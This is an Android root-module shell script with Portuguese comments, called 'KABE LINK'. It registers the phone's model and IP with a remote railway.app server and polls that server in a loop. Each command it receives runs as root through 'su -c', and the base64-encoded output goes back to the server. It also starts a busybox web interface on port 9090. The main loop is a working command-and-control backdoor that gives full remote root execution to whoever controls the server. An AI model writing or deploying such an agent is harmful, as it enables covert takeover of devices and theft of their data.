#!/system/bin/sh
# ═══════════════════════════════════════════════════════
#   KABE LINK — Conexao reversa ao site (de qualquer lugar)
#   O celular conecta PRA FORA no site KABE PRIVATE.
#   Funciona em qualquer rede (WiFi, 4G/5G).
# ═══════════════════════════════════════════════════════

MODDIR=${0%/*}
DATA_DIR="/data/adb/kabe"
KEY_FILE="$DATA_DIR/key"
CONFIG_FILE="$DATA_DIR/config"
LOG_FILE="$DATA_DIR/link.log"
PID_FILE="$DATA_DIR/link.pid"
WEB_DIR="$MODDIR/webroot"
WEB_PORT=9090

DEFAULT_SERVER="https://kabe-private-production.up.railway.app"

mkdir -p "$DATA_DIR" 2>/dev/null

log() {
    echo "$(date '+%H:%M:%S') $1" >> "$LOG_FILE"
}

# curl com fallback wget
http_get() {
    curl -s --connect-timeout 5 --max-time 10 "$1" 2>/dev/null || \
    wget -q -O - --timeout=10 "$1" 2>/dev/null
}

http_post_json() {
    curl -s --connect-timeout 5 --max-time 10 -X POST \
        -H "Content-Type: application/json" -d "$2" "$1" 2>/dev/null || \
    wget -q -O - --timeout=10 --header="Content-Type: application/json" \
        --post-data="$2" "$1" 2>/dev/null
}

json_esc() {
    printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g'
}

read_config() {
    if [ -f "$CONFIG_FILE" ]; then
        grep "^$1=" "$CONFIG_FILE" 2>/dev/null | cut -d= -f2-
    fi
}

save_config() {
    local k="$1"
    local v="$2"
    if [ -f "$CONFIG_FILE" ] && grep -q "^$k=" "$CONFIG_FILE" 2>/dev/null; then
        sed -i "s|^$k=.*|$k=$v|" "$CONFIG_FILE" 2>/dev/null
    else
        echo "$k=$v" >> "$CONFIG_FILE"
    fi
}

# Gerar status.json para a WebUI ler
write_status() {
    local agent_online="false"
    local server_reachable="false"
    local httpd_pid=""

    # Verificar se httpd esta rodando
    if [ -f "$DATA_DIR/httpd.pid" ]; then
        httpd_pid=$(cat "$DATA_DIR/httpd.pid" 2>/dev/null)
        if [ -n "$httpd_pid" ] && kill -0 "$httpd_pid" 2>/dev/null; then
            httpd_pid="running"
        else
            httpd_pid="stopped"
        fi
    fi

    # Verificar se o servidor responde
    local ping_result=$(http_get "$SERVER_URL/api/agent/list" 2>/dev/null)
    if [ -n "$ping_result" ] && echo "$ping_result" | grep -q "key"; then
        server_reachable="true"
        # Verificar se ESTE device esta online
        if echo "$ping_result" | grep -q "$KEY"; then
            agent_online="true"
        fi
    fi

    cat > "$WEB_DIR/status.json" << EOF
{
  "key": "$KEY",
  "server": "$SERVER_URL",
  "device": "$DEVICE_ID",
  "ip": "$PHONE_IP",
  "agentOnline": $agent_online,
  "serverReachable": $server_reachable,
  "httpd": "$httpd_pid",
  "webPort": $WEB_PORT,
  "time": "$(date '+%H:%M:%S')"
}
EOF
}

# ===== GERAR KEY SE NAO EXISTIR =====
if [ ! -f "$KEY_FILE" ]; then
    RANDOM_PART=$(cat /proc/sys/kernel/random/uuid 2>/dev/null | tr -d '-' | head -c 8 | tr 'a-z' 'A-Z')
    [ -z "$RANDOM_PART" ] && RANDOM_PART=$(date +%s | md5sum 2>/dev/null | head -c 8 | tr 'a-z' 'A-Z')
    KEY="KABE-${RANDOM_PART}"
    echo "$KEY" > "$KEY_FILE"
    chmod 600 "$KEY_FILE"
    log "Key gerada: $KEY"
fi

KEY=$(cat "$KEY_FILE" 2>/dev/null | tr -d '\n\r' | xargs)
if [ -z "$KEY" ]; then
    log "ERRO: Key vazia"
    exit 1
fi

# Server do config
SERVER_URL=$(read_config "server")
if [ -z "$SERVER_URL" ]; then
    SERVER_URL="$DEFAULT_SERVER"
    save_config "server" "$SERVER_URL"
fi

# Device ID e IP
DEVICE_ID=$(getprop ro.product.model 2>/dev/null)
[ -z "$DEVICE_ID" ] && DEVICE_ID="android-$(cat /proc/sys/kernel/random/uuid 2>/dev/null | head -c 8)"

PHONE_IP=""
for iface in wlan0 eth0 wlan1 rmnet0; do
    PHONE_IP=$(ip addr show "$iface" 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
    [ -n "$PHONE_IP" ] && break
done
[ -z "$PHONE_IP" ] && PHONE_IP="unknown"

log "════════════════════════════════════════"
log "KABE LINK iniciado"
log "Key: $KEY"
log "Server: $SERVER_URL"
log "Device: $DEVICE_ID"
log "IP: $PHONE_IP"
log "════════════════════════════════════════"

# ===== MATAR PROCESSOS ANTIGOS =====
if [ -f "$PID_FILE" ]; then
    OLD_PID=$(cat "$PID_FILE" 2>/dev/null)
    if [ -n "$OLD_PID" ] && kill -0 "$OLD_PID" 2>/dev/null; then
        kill -9 "$OLD_PID" 2>/dev/null
        sleep 1
    fi
fi

# Matar httpd antigo
pkill -f "busybox httpd.*9090" 2>/dev/null
sleep 1

echo $$ > "$PID_FILE"

# ===== WEBUI via httpd =====
log "WebUI: http://$PHONE_IP:$WEB_PORT"
busybox httpd -f -p $WEB_PORT -h "$WEB_DIR" >> "$LOG_FILE" 2>&1 &
HTTPD_PID=$!
echo "$HTTPD_PID" > "$DATA_DIR/httpd.pid"
log "httpd iniciado (PID $HTTPD_PID)"

# ===== LOOP PRINCIPAL =====
log "Iniciando loop de polling..."

while true; do
    # Sinal de parada
    if [ -f "$DATA_DIR/stop" ]; then
        rm -f "$DATA_DIR/stop"
        log "Sinal de parada recebido"
        break
    fi

    # Verificar se httpd morreu, reiniciar
    if ! kill -0 $HTTPD_PID 2>/dev/null; then
        log "httpd morreu, reiniciando..."
        pkill -f "busybox httpd.*9090" 2>/dev/null
        sleep 1
        busybox httpd -f -p $WEB_PORT -h "$WEB_DIR" >> "$LOG_FILE" 2>&1 &
        HTTPD_PID=$!
        echo "$HTTPD_PID" > "$DATA_DIR/httpd.pid"
        log "httpd reiniciado (PID $HTTPD_PID)"
    fi

    # Heartbeat + registro
    http_post_json "$SERVER_URL/api/agent/register" "{\"key\":\"$KEY\",\"id\":\"$(json_esc "$DEVICE_ID")\",\"ip\":\"$PHONE_IP\"}" > /dev/null 2>&1 &

    # Poll por comandos
    RESPONSE=$(http_get "$SERVER_URL/api/agent/poll?key=$KEY")

    if [ -n "$RESPONSE" ] && [ "$RESPONSE" != "null" ] && [ "$RESPONSE" != "" ]; then
        CMD_ID=$(echo "$RESPONSE" | grep -o '"id":[0-9]*' | head -1 | cut -d: -f2)
        CMD_TEXT=$(echo "$RESPONSE" | grep -o '"cmd":"[^"]*"' | head -1 | cut -d'"' -f4)

        if [ -n "$CMD_TEXT" ] && [ -n "$CMD_ID" ]; then
            log "Executando cmd #$CMD_ID: $CMD_TEXT"
            OUTPUT=$(su -c "$CMD_TEXT" 2>&1)
            EXIT_CODE=$?

            OUTPUT_B64=$(echo "$OUTPUT" | base64 -w 0 2>/dev/null || echo "$OUTPUT" | base64 2>/dev/null)
            http_post_json "$SERVER_URL/api/agent/output" "{\"key\":\"$KEY\",\"id\":$CMD_ID,\"exit\":$EXIT_CODE,\"data\":\"$OUTPUT_B64\"}" > /dev/null 2>&1 &
            log "Cmd #$CMD_ID concluido (exit=$EXIT_CODE)"
        fi
    fi

    # Atualizar status.json a cada 3 segundos
    write_status

    sleep 2
done

rm -f "$PID_FILE"
log "KABE LINK parado"
